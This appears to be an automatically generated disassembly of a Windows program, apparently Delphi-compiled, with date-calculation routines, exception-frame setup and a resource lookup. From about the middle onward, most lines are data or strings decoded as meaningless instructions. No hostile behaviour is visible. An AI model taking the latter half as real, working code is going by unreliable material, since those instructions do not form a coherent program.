inc ebx
sub_4789b4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov ebx eax
mov cx 0x1
mov dx 0x1
mov ax 0x76c
call sub_409e10
fcomp [ ebp + 0x8 ]
fnstsw ax
sahf
jb r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea ecx [ ebp - 0xe ]
lea edx [ ebp - 0xc ]
lea eax [ ebp - 0xa ]
call sub_409f8c
sub bl 0x12
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
cmp [ ebp - 0xe ] 0xf
jb r-xdata
dec ebx
sub bl 0x5
jb r-xdata
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov [ ebp - 0xe ] 0x1
jmp r-xdata
mov [ ebp - 0xe ] 0xf
jmp r-xdata
mov [ ebp - 0xe ] 0x1
jmp r-xdata
je r-xdata
mov cx [ ebp - 0xe ]
mov dx [ ebp - 0xc ]
mov ax [ ebp - 0xa ]
call sub_409e10
fstp [ ebp - 0x8 ]
fwait
mov [ ebp - 0xe ] 0x1
mov [ ebp - 0xc ] 0x1
jmp r-xdata
sub_478a54
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov [ edx - 0x2 ] 0x1
mov edx [ ebp + 0x8 ]
cmp ax [ edx - 0x4 ]
jae r-xdata
mov edx [ ebp + 0x8 ]
dec [ edx - 0x6 ]
mov edx [ ebp + 0x8 ]
sub ax [ edx - 0x4 ]
mov dx 0xc
sub dx ax
mov eax [ ebp + 0x8 ]
mov [ eax - 0x4 ] dx
pop ebp
retn
mov edx [ ebp + 0x8 ]
sub [ edx - 0x4 ] ax
pop ebp
retn
sub_478a90
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov [ edx - 0x2 ] 0x1
mov edx [ ebp + 0x8 ]
add [ edx - 0x4 ] ax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0xc
jbe r-xdata
pop ebp
retn
mov eax [ ebp + 0x8 ]
inc [ eax - 0x6 ]
mov eax [ ebp + 0x8 ]
sub [ eax - 0x4 ] 0xc
sub_478ac0
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
cmp [ edx - 0x7 ] 0x0
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_478a54
pop ecx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_478a90
pop ecx
pop ebp
retn
sub_478ae4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx ecx
mov [ ebp - 0x7 ] dl
test al al
je r-xdata
cmp [ ebp - 0x7 ] 0x0
je r-xdata
push [ ebx + 0x4 ]
push [ ebx ]
lea ecx [ ebp - 0x2 ]
lea edx [ ebp - 0x4 ]
lea eax [ ebp - 0x6 ]
call sub_409f8c
xor eax eax
mov al [ ebp + 0x8 ]
add eax 0xffffffee
cmp eax 0x6
ja r-xdata
fld [ ebx ]
fsub [ ebp + 0xc ]
fstp [ ebx ]
fwait
fld [ ebx ]
fadd [ ebp + 0xc ]
fstp [ ebx ]
fwait
jmp r-xdata
cmp [ ebp - 0x7 ] 0x0
je r-xdata
jmp [ eax * 4 + jump_table_478b23 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
fld [ ebx ]
fsub [ ebp + 0xc ]
fstp [ ebx ]
fwait
jmp r-xdata
fld [ ebx ]
fadd [ ebp + 0xc ]
fstp [ ebx ]
fwait
jmp r-xdata
cmp [ ebp - 0x2 ] 0xf
jbe r-xdata
push ebp
mov ax 0x1
call sub_478ac0
pop ecx
jmp r-xdata
push ebp
mov ax 0x2
call sub_478ac0
pop ecx
jmp r-xdata
push ebp
mov ax 0x3
call sub_478ac0
pop ecx
jmp r-xdata
push ebp
mov ax 0x4
call sub_478ac0
pop ecx
jmp r-xdata
push ebp
mov ax 0x6
call sub_478ac0
pop ecx
jmp r-xdata
cmp [ ebp - 0x7 ] 0x0
je r-xdata
cmp [ ebp - 0x2 ] 0x1
jbe r-xdata
mov [ ebp - 0x2 ] 0xf
jmp r-xdata
mov cx [ ebp - 0x2 ]
mov dx [ ebp - 0x4 ]
mov ax [ ebp - 0x6 ]
call sub_409e10
fstp [ ebx ]
fwait
jmp r-xdata
dec [ ebp - 0x6 ]
jmp r-xdata
inc [ ebp - 0x6 ]
jmp r-xdata
push ebp
mov ax 0x1
call sub_478ac0
pop ecx
mov [ ebp - 0x2 ] 0xf
jmp r-xdata
mov [ ebp - 0x2 ] 0x1
jmp r-xdata
sub_478c18
push ebp
mov ebp esp
add esp 0xfffffff8
fld [ ebp + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jb r-xdata
fld [ ebp + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jae r-xdata
fld [ r-xdata ]
fmul [ ebp + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
call sub_478c18
fmul [ r-xdata ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
fld [ ebp + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jae r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
add esp 0xfffffff8
fstp [ esp ]
fwait
call sub_478c18
fld [ r-xdata ]
fmulp st1
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
fld [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn 0x8
fld [ ebp + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jae r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x40000000
jmp r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x40240000
xor eax eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x40140000
jmp r-xdata
sub_478ce8
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
xor edx edx
mov [ ebp - 0x104 ] edx
xor edx edx
push ebp
push sub_478d7c
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x100 ]
xchg edx eax
call sub_408a50
push 0x2
lea eax [ ebp - 0x100 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
call FindResourceA
test eax eax
je r-xdata
xor ebx ebx
lea eax [ ebp - 0x104 ]
lea edx [ ebp - 0x100 ]
mov ecx 0x100
call sub_404304
mov ecx [ ebp - 0x104 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_422ee0
mov bl 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_478d83
lea eax [ ebp - 0x104 ]
call sub_404094
retn
sub_478d8c
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x114 ] ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_478e72
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x9 ] 0x1
xor eax eax
push ebp
push j_sub_403910
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
push ebp
lea edx [ ebp - 0x110 ]
mov eax [ ebx ]
mov eax [ eax ]
call sub_403294
lea edx [ ebp - 0x110 ]
lea eax [ ebp - 0x10 ]
call sub_4042f8
mov eax [ ebp - 0x10 ]
call sub_478ce8
pop ecx
test al al
jne r-xdata
mov [ ebp - 0x9 ] 0x0
push ebp
mov eax [ ebx ]
mov eax [ eax ]
call sub_4032d0
lea edx [ ebp - 0x110 ]
call sub_403294
lea edx [ ebp - 0x110 ]
lea eax [ ebp - 0x114 ]
call sub_4042f8
mov eax [ ebp - 0x114 ]
call sub_478ce8
pop ecx
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_478e79
lea eax [ ebp - 0x114 ]
call sub_404094
lea eax [ ebp - 0x10 ]
call sub_404094
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_478e40
add [ eax ] eax
add [ eax ] al
adc al 0x72
inc eax
add [ esi + ecx * 4 + 0x47 ] cl
add al ch
sti
lodsb [ esi ]
clc
push [ ebx ]
rcr [ edx + 0x59 ] 0x59
mov [ fs : eax ] edx
push sub_478e79
lea eax [ ebp - 0x114 ]
call sub_404094
lea eax [ ebp - 0x10 ]
call sub_404094
retn
sub_478ea0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_478eef
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_478ef6
retn
mov eax [ rw-data ]
mov eax [ eax ]
xor ecx ecx
mov edx 0x7e4
call sub_4611f4
mov eax rw-data
mov ecx 0x5
mov edx [ r-xdata ]
call sub_404b1c
sub_478fa9
outsb
je r-xdata
dec esi
outsd
je r-xdata
inc eax
add ah dh
int1
inc edi
add [ eax - 0x5fffbeb6 ] bl
dec edx
inc ecx
outsb
imul ebp [ fs : esi + 0x67 ] 0x446f6c0c
jae r-xdata
or al 0x6c
outsd
inc esp
insb
adc al 0x73
insd
jae r-xdata
add [ eax - 0x80000000 ] al
add [ eax ] eax
add al 0x4e
popad
insd
lodsb [ gs : esi ]
adc [ eax ] al
and [ eax ] al
add bh bh
dec esp
imul esi [ ebx + 0x74 ] 0x90d4c08b
inc edi
add [ edi ] al
andps xmm0 [ ebx + 0x68 ]
popad
jb r-xdata
add [ esi + esi * 8 - 0xc37ffb9 ] al
inc edi
add ah ch
inc edi
add al al
cmc
inc edi
add [ eax + 0x7c0047f2 ] dh
inc edi
add [ eax - 0xf ] dh
inc edi
add [ edx + esi * 8 ] ah
inc edi
add [ eax - 0xe ] dl
inc edi
add [ esi + esi * 8 ] cl
inc edi
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + 0x280040 ] bh
add [ eax ] al
mov esp 0x50004010
add [ eax ] al
add [ edi ] cl
push esp
inc ebx
push 0x56747261
popad
insb
jne r-xdata
outsb
imul ebp [ fs : esi + 0x67 ] 0x45655408
outsd
outsb
or ebp [ gs : edi + ebp * 2 + 0x41 ]
jae r-xdata
popad
bound esp [ ebp + 0x6c ]
add [ eax ] al
push esi
popad
insb
jne r-xdata
outsb
inc ebp
outsb
je r-xdata
add [ eax ] al
adc dl [ edx + 0x180047 ]
add [ eax ] al
dec esp
jno r-xdata
je r-xdata
add [ eax + 0x4d0a0002 ] al
jne r-xdata
inc edi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
dec esp
imul esi [ ebx + 0x74 ] r-xdata
push esp
and [ ecx ] eax
add eax 0x65540800
inc ebp
outsb
imul ebp [ bp + 0x65 ] 0x10000005
inc eax
add [ eax + eax ] al
add bh bh
mov al 0xf5
inc edi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x44080000 ] al
popad
je r-xdata
jae r-xdata
outsd
je r-xdata
js r-xdata
add [ ebp + esi + 0x35980040 ] cl
inc eax
add [ ebp + esi + 0x35a00040 ] bl
inc eax
add [ ebp + esi + 0x32dc0040 ] dl
inc eax
add al bh
xor al [ eax ]
in al 0x87
inc edi
add [ eax - 0x5fffbeb6 ] bl
dec edx
inc ecx
add [ eax + esi * 4 + 0xe0047 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] dl
xchg edx eax
jo r-xdata
jb r-xdata
push esp
imul ebp [ ebp + 0x65 ] r-xdata
sub [ eax ] al
add bh bh
sub [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
nop
je r-xdata
insb
or [ ebx + 0x6d ] esi
jae r-xdata
add [ ecx ] 0x0
pop es
jae r-xdata
inc edi
add [ eax ] bl
add [ eax ] al
add [ ecx + esi * 2 + 0x47 ] cl
imul esp [ ebp + 0x72 ] r-xdata
sub al 0x0
add bh bh
sub al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax [ eax ]
add eax 0x6564724f
jb r-xdata
inc eax
add [ eax ] ah
add [ eax ] al
dec [ ebx + esi * 8 + 0x10047 ]
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al [ eax ]
or cl [ ebp + 0x75 ]
insb
adc [ eax ] al
push eax
add [ eax ] al
[ esi + esi * 8 + 0x47 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x560b0004 ] al
popad
insb
jne r-xdata
push eax
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + edx * 4 - 0x6f2bffb9 ] ah
inc edi
imul ebp [ bp + 0x65 ] 0x47907490
push esi
popad
insb
jne r-xdata
inc ebp
js r-xdata
imul ebp [ edi + 0x6e ] r-xdata
or [ eax ] al
add bh bh
dec eax
mov [ edi ] al
popad
jo r-xdata
adc al 0x0
add bh bh
pop eax
mov cl 0x47
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070001 ] al
imul esi [ esp + ebp * 2 + 0x65 ] 0x9228c08b
inc edi
add [ edi ] al
andps xmm0 [ ebx + 0x68 ]
popad
jb r-xdata
add [ eax ] eax
add [ eax ] al
mov esp 0x14004010
add [ eax ] al
add [ edi ] cl
push esp
inc ebx
push 0x41747261
push ebx
outsd
jne r-xdata
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x58004790 ] bh
add [ eax ] al
add al ah
and [ ecx ] al
nop
inc edi
add ah dl
nop
or [ ebp + 0x45 ] dl
outsb
imul ebp [ bp + 0x65 ] 0xe000408d
pop [ edi ]
add ecx [ edi ]
push esp
inc ebx
push 0x4c747261
imul esi [ ebx + 0x74 ] 0x6564724f
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x17ffb86d ] bh
jo r-xdata
add [ ebx ] al
cld
xchg edx eax
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bh
xchg edx eax
inc edi
add [ eax + eax ] cl
add [ eax ] al
adc al 0x72
inc eax
add [ ebp + esi + 0x35980040 ] cl
inc eax
add [ ebp + esi + 0x35a00040 ] bl
inc eax
add [ ebp + esi + 0x32dc0040 ] dl
inc eax
add al bh
xor al [ eax ]
xor al 0x33
inc eax
add [ 0x73697841 ] cl
add [ eax + 0x46040002 ] al
outsd
outsb
je r-xdata
add [ eax ] al
inc ecx
js r-xdata
jb r-xdata
arpl [ ebp - 0x70 ] sp
hlt
add [ eax ] al
add [ edx ] al
add [ eax ] al
add ah bl
pop [ edi ]
push es
insb
outsd
add [ eax ] al
add [ eax ] al
add al [ eax ]
add [ eax ] al
fmul [ edi + 0x6c060047 ]
add [ eax ] al
add [ eax ] al
add dl dl
xchg ebx eax
inc edi
add ah ah
add [ eax ] al
add al ah
and [ ecx ] al
imul ebp [ edi + 0x6e ] 0x9310c08b
inc edi
add [ ebx ] al
andps xmm0 [ ecx + 0x78 ]
imul esi [ ebx + 0x4c ] 0x6c656261
push ebx
je r-xdata
aam 0x87
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jae r-xdata
inc ecx
mov al [ 0xffffffff94004035 ]
xor eax 0x32dc0040
insb
add [ gs : eax ] eax
add [ eax ] al
add [ eax + eax ] al
add [ eax ] al
or al 0x93
inc edi
add [ edi ] al
je r-xdata
inc ebx
add [ eax ] cl
push esp
inc ebp
outsb
imul ebp [ bp + 0x65 ] 0x10540003
inc eax
add [ eax + eax ] cl
add bh bh
hlt
imul esi [ esp + ebp * 2 + 0x65 ] r-xdata
mov eax 0x3004771
inc eax
je r-xdata
inc eax
add al bh
xor al [ eax ]
push esp
inc eax
add [ ebp + esi + 0x35a00040 ] bl
insb
inc ecx
jne r-xdata
outsd
jae r-xdata
inc eax
add al bh
xor al [ eax ]
push esp
mov ah 0x47
add [ eax - 0x5fffbeb6 ] bl
dec edx
mov al [ 0xffffffff94004035 ]
insd
inc ebx
push 0x41747261
js r-xdata
mov ah 0x47
outsd
pop es
je r-xdata
add [ eax + eax ] 0x10
arpl [ ebp + 0x61 ] cx
or [ ebp + 0x45 ] dl
js r-xdata
add [ ebp + esi + 0x32dc0040 ] dl
jae r-xdata
inc eax
add [ ebp + esi + 0x32dc0040 ] dl
insb
dec esi
outsd
outsb
or [ gs : ecx + 0x6c ] dh
push esi
popad
insb
jne r-xdata
add [ ecx ] al
jae r-xdata
js r-xdata
insd
jne r-xdata
xchg esp eax
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x6c ] bh
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x6c ] ch
inc edi
add al ch
add [ eax ] al
add [ eax - 0x6d ] ah
inc edi
add [ ebp + esi + 0x35980040 ] cl
inc eax
add [ ebp + esi + 0x35a00040 ] bl
imul ebp [ esi + 0x65 ] 0x5c900000
inc edi
add [ edi ] al
or dl [ ebx + eax * 2 + 0x68 ]
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rcl [ ebx + 0xe40047 ] cl
add [ eax ] al
loopne r-xdata
call 0x747db7c
adc [ ebx + eax * 2 + 0x75 ] dl
jae r-xdata
cwde
dec edx
inc ecx
add [ eax + 0x7400414a ] ah
mov esi 0xe0047
pop es
je r-xdata
jbe r-xdata
add [ fs : eax ] dl
inc eax
add [ eax ] al
add bh bh
xor al 0xb4
inc edi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
je r-xdata
popad
insb
jne r-xdata
jae r-xdata
add [ eax ] dl
inc eax
add [ esi ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
add al [ eax ]
adc [ ecx + 0x75 ] al
je r-xdata
inc ecx
js r-xdata
add [ eax - 0x5fffbeb6 ] bl
dec edx
inc ecx
inc edi
inc ecx
add [ ebp + esi + 0x35980040 ] cl
add [ esi + edi * 4 + 0x47 ] dh
add [ edx ] cl
push esp
inc ebx
push 0x41747261
js r-xdata
outsd
insd
inc ebx
push 0x41747261
js r-xdata
xor eax 0x32dc0040
xchg esp eax
outsd
insb
dec ebp
popad
jb r-xdata
or cl [ ecx + 0x62 ]
insb
jb r-xdata
add [ esi ] al
inc ebx
outsb
je r-xdata
dec ecx
push esp
imul ebp [ ebp + 0x65 ] r-xdata
cmp al 0x0
add bh bh
sbb al 0xb4
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x47040007 ] al
jae r-xdata
push es
add [ 0x63617845 ] cl
je r-xdata
outsd
jb r-xdata
add [ esi ] cl
inc esp
popad
je r-xdata
insd
popad
je r-xdata
add [ eax ] al
push es
jae r-xdata
inc ecx
jae r-xdata
add [ eax ] al
add [ eax ] al
add al [ eax ]
add [ eax ] al
mov esp 0x60004010
add [ eax ] al
add [ eax + edx + 0x640040 ] bh
add [ eax ] al
adc [ ebx + eax * 2 + 0x75 ] dl
jae r-xdata
pop es
je r-xdata
add [ esp + ecx * 2 ] cl
popad
bound esp [ ebp + 0x6c ]
jae r-xdata
outsd
outsb
je r-xdata
add bh bh
clc
mov bh 0x47
dec esp
popad
add [ fs : eax ] dl
inc eax
add [ ecx ] al
add bh bh
insb
les eax [ edi ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
or eax [ eax ]
push es
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
inc edi
adc [ eax ] al
inc esp
add [ eax ] al
push eax
mov [ edi ] 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or al 0x0
or ecx [ ecx + 0x62 ]
insb
jae r-xdata
jb r-xdata
adc [ eax ] al
lea eax [ eax ]
add bh bh
cwde
lds eax [ edi ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al [ eax ]
or [ ecx + 0x6e ] cl
popad
jb r-xdata
add al 0x47
popad
je r-xdata
add [ eax ] al
or [ eax ] al
or al 0x47
jb r-xdata
add [ eax ] al
push esp
imul ebp [ ebp + 0x65 ] 0x6d726f46
popad
je r-xdata
add [ 0x61440e00 ] 0x74
push esp
arpl [ ebp + 0x69 ] cx
outsb
imul ebp [ ebp + 0x75 ] 0x4723406d
add [ eax ] ch
add [ eax ] al
js r-xdata
dec ebp
popad
xchg esp eax
inc edi
add ah ah
xchg ebx eax
inc edi
add [ edi ] ah
add [ eax ] cl
push esp
inc ebp
outsb
imul ebp [ bp + 0x65 ] 0x10000027
inc eax
add [ eax + eax ] al
add bh bh
mov al [ 0x10047c4 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ eax ] al
or [ ecx + 0x75 ] eax
je r-xdata
add [ esp + esi * 4 + 0x47 ] dl
outsb
imul ebp [ bp + 0x65 ] 0x5c900000
xchg ebx eax
inc edi
add [ ecx + 0x41 ] dl
add [ eax ] al
add [ eax ] cl
push esp
inc ebp
add [ esi + edi * 4 + 0x47 ] dh
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + 0x600040 ] bh
add [ eax ] al
mov esp 0x64004010
add [ eax ] al
insb
push esp
js r-xdata
insb
outsb
inc ecx
js r-xdata
adc [ eax ] al
push 0x0
insb
jae r-xdata
jne r-xdata
push cs
add [ edi ] cl
dec esp
popad
bound esp [ ebp + 0x6c ]
jae r-xdata
jae r-xdata
outsb
insb
add al 0xb9
inc ecx
add [ eax ] cl
add bh bh
add ah 0x47
add [ eax + 0x47c4 ] dl
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4c0a000d ] al
popad
bound esp [ ebp + 0x6c ]
bound esp [ ebp + 0x6c ]
jae r-xdata
outsb
arpl [ edx + 0x65 ] si
insd
outsb
je r-xdata
lodsb [ fs : esi ]
adc [ eax ] al
or [ eax ] al
add bh bh
cmp al cl
inc edi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49090009 ] al
dec [ eax - 0x4c ]
inc edi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
adc [ eax ] al
add [ fs : eax ] al
jmp [ edi + esi * 4 + 0x47 ]
adc [ eax ] al
push 0xf8ff0000
mov [ edi ] 0x1
add [ eax ] al
add [ eax + 0x1 ] al
add [ eax ] eax
add [ eax ] al
jae r-xdata
add [ eax + 0x41040003 ] al
add [ eax ] al
insd
popad
je r-xdata
add [ eax ] dl
push esp
inc ebx
jne r-xdata
adc [ eax ] al
add [ fs : eax ] al
xchg ebx eax
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ ebp + 0x45 ] dl
outsb
imul ebp [ bp + 0x65 ] r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax 0xe8004793
add [ eax ] al
[ ebp + eax * 8 + 0x10047 ]
imul edi [ edx + 0x65 ] r-xdata
pop eax
adc al [ eax ]
or cl [ ecx + 0x62 ]
insb
push ebx
je r-xdata
jae r-xdata
add [ eax ] dl
jo r-xdata
jae r-xdata
add [ eax ] al
je r-xdata
dec esp
les eax [ edi ]
adc [ eax ] al
pushad
add [ eax ] al
inc [ ebp + eax * 8 - 0x3ad3ffb9 ]
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x41100004 ] al
js r-xdata
add [ eax - 0x80000000 ] al
add eax [ eax ]
add al 0x41
arpl [ eax ] ax
adc [ eax ] al
add eax 0xfcff0000
les eax [ edi ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
add [ eax ] eax
adc [ ecx + 0x75 ] al
je r-xdata
add [ eax ] al
inc eax
add [ eax ] ah
add [ eax ] al
[ eax ]
mov [ edi ] 0x1
add [ eax ] al
add [ eax ] al
insb
add [ gs : eax ] dl
add [ eax ] al
dec [ eax + ecx * 8 ]
inc edi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] al
push eax
add [ eax ] al
call [ edi + eax * 8 + 0x47 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ edx ] 0x0
add [ eax ] al
adc [ eax ] al
adc [ ecx + 0x62 ] cl
push ss
je r-xdata
add [ eax ] al
jb r-xdata
add [ eax ] al
adc [ eax ] eax
or cl [ ecx + 0x62 ]
insb
add [ eax ] 0x0
dec esp
imul ebp [ esi + 0x65 ] r-xdata
dec esp
add [ eax ] al
jmp esp
inc ecx
add [ eax ] dl
insd
popad
je r-xdata
add [ edi ] al
dec ebp
imul ebp [ esi + 0x69 ] 0x546d756d
and [ edi ] al
insb
add [ eax ] al
[ eax ]
insd
imul esp [ ebx + 0x54 ] 0x24004010
add [ eax ] 0x0
add [ eax ] al
adc eax [ eax ]
or ecx [ edi + ebp * 2 + 0x67 ]
popad
je r-xdata
jb r-xdata
popad
outsd
outsb
push esp
adc [ eax ] al
push esp
add [ eax ] al
sub_4791ac
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx - 0x6dd7ffb9 ] dl
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] dl
xchg edx eax
inc edi
add [ eax ] bl
add [ eax ] al
add [ ecx + esi * 2 + 0x47 ] cl
add [ ebp + esi + 0x35980040 ] cl
inc eax
add [ ebp + esi + 0x35a00040 ] bl
inc eax
add [ ebp + esi + 0x32dc0040 ] dl
inc eax
add al bh
xor al [ eax ]
in al 0x87
inc edi
add [ eax - 0x5fffbeb6 ] bl
dec edx
inc ecx
add [ eax + esi * 4 + 0xe0047 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
mov esp 0x14004010
add [ eax ] al
add [ edi ] cl
push esp
inc ebx
push 0x41747261
js r-xdata
add [ ecx ] 0x0
pop es
jae r-xdata
inc ebp
js r-xdata
imul ebp [ edi + 0x6e ] r-xdata
or [ eax ] al
add bh bh
dec eax
mov [ edi ] al
popad
jo r-xdata
adc al 0x0
add bh bh
pop eax
mov cl 0x47
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070001 ] al
imul esi [ esp + ebp * 2 + 0x65 ] 0x9228c08b
inc edi
add [ edi ] al
andps xmm0 [ ebx + 0x68 ]
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x17ffb86d ] bh
jo r-xdata
add [ ebx ] al
cld
xchg edx eax
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bh
xchg edx eax
inc edi
add [ eax + eax ] cl
add [ eax ] al
adc al 0x72
inc eax
add [ ebp + esi + 0x35980040 ] cl
inc eax
add [ ebp + esi + 0x35a00040 ] bl
inc eax
add [ ebp + esi + 0x32dc0040 ] dl
inc eax
add al bh
xor al [ eax ]
xor al 0x33
inc eax
add [ 0x73697841 ] cl
add [ eax + 0x46040002 ] al
outsd
outsb
je r-xdata
add [ eax ] al
inc ecx
js r-xdata
add [ eax ] al
add [ eax ] al
add dl dl
xchg ebx eax
inc edi
add ah ah
add [ eax ] al
add al ah
and [ ecx ] al
imul ebp [ edi + 0x6e ] 0x9310c08b
inc edi
add [ ebx ] al
andps xmm0 [ ecx + 0x78 ]
imul esi [ ebx + 0x4c ] 0x6c656261
push ebx
je r-xdata
aam 0x87
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jae r-xdata
mov al [ 0xffffffff94004035 ]
xor eax 0x32dc0040
insb
add [ gs : eax ] eax
add [ eax ] al
add [ eax + eax ] al
add [ eax ] al
or al 0x93
inc edi
add [ edi ] al
je r-xdata
inc ebx
add [ eax ] cl
push esp
inc ebp
outsb
imul ebp [ bp + 0x65 ] 0x10540003
inc eax
add [ eax + eax ] cl
add bh bh
hlt
imul esi [ esp + ebp * 2 + 0x65 ] r-xdata
mov eax 0x3004771
inc eax
je r-xdata
inc eax
add al bh
xor al [ eax ]
push esp
inc eax
add [ ebp + esi + 0x35a00040 ] bl
insb
inc ecx
jne r-xdata
outsd
jae r-xdata
inc eax
add al bh
xor al [ eax ]
push esp
mov ah 0x47
add [ eax - 0x5fffbeb6 ] bl
dec edx
mov al [ 0xffffffff94004035 ]
insd
inc ebx
push 0x41747261
js r-xdata
mov ah 0x47
outsd
pop es
je r-xdata
